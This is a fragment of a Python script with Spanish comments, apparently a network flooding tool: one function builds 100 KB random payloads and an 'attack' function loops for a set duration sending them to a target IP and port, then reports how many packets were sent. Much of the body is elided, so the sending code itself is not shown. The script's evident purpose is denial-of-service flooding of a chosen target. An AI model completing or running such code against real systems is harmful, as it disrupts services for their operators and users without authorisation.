...
# Función que genera un payload de datos muy grandes y aleatorios
def generate_extremely_large_payload(size=100000):
    """Genera un payload muy grande (en este caso 100 KB)"""
...
def attack(target_ip, target_port, duration):
    ...
    while time.time() < end_time:
        ...
        payload = generate_extremely_large_payload(100000)  # Generar un payload de 100 KB
    ...
    print(f"Se enviaron {packet_count} paquetes de 100 KB a {target_ip}:{target_port}.")
